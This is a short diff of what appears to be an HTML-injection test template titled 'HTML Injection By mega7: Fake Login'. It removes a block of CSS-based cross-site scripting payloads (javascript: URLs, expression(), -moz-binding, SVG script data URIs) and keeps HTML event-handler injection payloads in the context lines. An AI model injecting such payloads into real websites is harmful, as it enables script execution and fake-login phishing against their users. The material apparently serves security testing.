@@ -8,25 +8,7 @@ info:
         <h1>HTML Injection By mega7: Fake Login</h1>
       </div>
       <div class="form-container">
-        <style>
-        width: expression(alert('XSS'));
-        background: url("javascript:alert('XSS')");
-        body {
-          -moz-binding: url("data:text/xml;base64,...");
-        }
-
-        body { animation: xss 1s; }
-        body {
-          behavior: url(xss.htc);
-        }
-        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
-        :root {
-          --xss: url('javascript:alert(1)');
-        }
-        body {
-          background: var(--xss);
-        }
-        </style>
+        
 
         <img onany=a(1) src="x" id="1" what="a">
         <xss id="x" style="position:absolute;" onanimationcancel="print()"></xss>
